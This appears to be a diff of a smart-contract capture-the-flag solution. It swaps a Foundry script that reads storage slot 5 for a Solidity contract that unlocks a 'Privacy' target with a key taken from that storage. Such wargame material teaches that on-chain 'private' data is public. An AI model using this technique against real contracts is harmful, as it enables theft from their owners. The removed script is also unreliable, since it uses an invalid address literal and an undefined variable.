@@ -1,16 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import { Script } from "forge-std/Script.sol";
+interface IPrivacy {
+    function unlock(bytes16 _key) external;
+    function locked() external view returns (bool);
+}
 
-contract POC is Script {
+contract PrivacySolver {
+    IPrivacy public target;
 
-    Privacy contractAdress = Privacy(0x);
+    constructor(address _targetAddress) {
+        target = IPrivacy(_targetAddress);
+    }
 
-    function run() external{
-        vm.startBroadcast();
-        bytes32 myKey = vm.load(address(contractAdress), bytes32(uint256(5)));
-        level12.unlock(bytes16(myKey));
-        vm.stopBroadcast();
+    function solve(bytes32 data2) public {
+        bytes16 key = bytes16(data2);
+        target.unlock(key);
     }
 }
